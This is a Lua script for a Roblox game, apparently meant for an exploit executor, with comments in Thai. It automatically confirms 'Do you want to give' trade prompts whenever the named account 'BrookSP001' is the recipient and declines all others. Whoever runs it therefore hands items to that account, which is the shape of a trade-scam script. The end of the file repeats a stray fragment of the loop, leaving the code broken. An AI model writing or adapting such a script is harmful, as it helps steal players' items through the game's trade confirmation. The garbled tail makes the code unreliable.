local Config = getgenv().AcceptTradeConfig or {
    TargetSender = "BrookSP001",
    AllowedItems = {
        ["Rainbow Comet Gnome"] = true,
    }
}

local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function resetTradeUI()
    pcall(function()
        for _, gui in ipairs(playerGui:GetDescendants()) do
            if gui.Name == "Are You Sure" and gui:IsA("GuiObject") then
                gui.Enabled = false
            end
        end
        GuiService.SelectedObject = nil
    end)
end

local function autoAcceptTradeLoop()
    local areYouSureGui = nil
    local confirmButton = nil
    local targetText = ""

    pcall(function()
        -- ค้นหาหน้าต่าง "Are You Sure" จากทุกที่ใน PlayerGui ป้องกันหาไม่เจอ
        for _, gui in ipairs(playerGui:GetDescendants()) do
            if gui.Name == "Are You Sure" and (gui:IsA("ScreenGui") or gui:IsA("Frame")) and gui.Visible then
                areYouSureGui = gui
                break
            end
        end

        if areYouSureGui then
            -- ค้นหาปุ่ม Yes และ TextLabel ด้านในแบบยืดหยุ่น
            for _, descendant in ipairs(areYouSureGui:GetDescendants()) do
                if descendant.Name == "Yes" and (descendant:IsA("TextButton") or descendant:IsA("ImageButton")) then
                    confirmButton = descendant
                elseif descendant:IsA("TextLabel") and string.find(descendant.Text, "Do you want to give") then
                    targetText = descendant.Text
                end
            end
        end
    end)

    if areYouSureGui and confirmButton then
        print("Detected Trade UI. Text:", targetText)

        -- เช็คชื่อผู้ส่ง
        local isValidSender = (Config.TargetSender == "" or string.find(targetText, Config.TargetSender))

        if isValidSender then
            while areYouSureGui and areYouSureGui.Parent do
                pcall(function()
                    if confirmButton and confirmButton.Parent then
                        GuiService.SelectedObject = confirmButton
                        
                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                        task.wait(0.02)
                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                        
                        for _, conn in ipairs(getconnections(confirmButton.Activated)) do
                            conn:Fire()
                        end
                        for _, conn in ipairs(getconnections(confirmButton.MouseButton1Click)) do
                            conn:Fire()
                        end
                    end
                end)
                task.wait(0.05)
            end

            task.wait(0.1)
            resetTradeUI()
        else
            -- ถ้าไม่ใช่คนส่งที่กำหนด ให้กดปุ่ม No ปฏิเสธไป
            pcall(function()
                for _, descendant in ipairs(areYouSureGui:GetDescendants()) do
                    if descendant.Name == "No" and (descendant:IsA("TextButton") or descendant:IsA("ImageButton")) then
                        GuiService.SelectedObject = descendant
                        for _, conn in ipairs(getconnections(descendant.Activated)) do
                            conn:Fire()
                        end
                    end
                end
            end)
            task.wait(0.5)
            resetTradeUI()
        end
        
        task.wait(0.2)
    end
end

while true do
    autoAcceptTradeLoop()
    task.wait(0.1)
end
            task.wait(0.5)
            resetTradeUI()
        end
        
        task.wait(0.2)
    end
end

while true do
    autoAcceptTradeLoop()
    task.wait(0.05)
end
end
